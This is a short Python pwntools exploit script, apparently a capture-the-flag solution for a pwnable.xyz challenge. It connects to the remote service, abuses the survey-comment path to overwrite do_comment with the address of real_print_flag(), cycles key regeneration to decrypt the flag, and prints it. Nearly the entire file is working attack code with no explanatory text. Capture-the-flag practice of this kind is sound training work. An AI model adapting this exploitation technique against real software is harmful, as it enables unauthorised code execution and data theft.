from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30006)

sla = r.sendlineafter
sa = r.sendafter

def regen_key(key_len):
    sla('> ', '1')
    sla('key len: ', str(key_len))

def load_flag():
    sla('> ', '2')

def print_flag(survey, comment):
    sla('> ', '3')
    sa('Wanna take a survey instead? ', survey)
    if survey == 'y':
        sa('Enter comment: ', comment)


# write address of real_print_flag() on do_comment

print_flag('y', 'a')

regen_key(0x40)


# Decrypt flag

for l in range(0x3f, 0, -1):
    regen_key(l)

load_flag()


# print flag

print_flag('n', 'a')


r.interactive()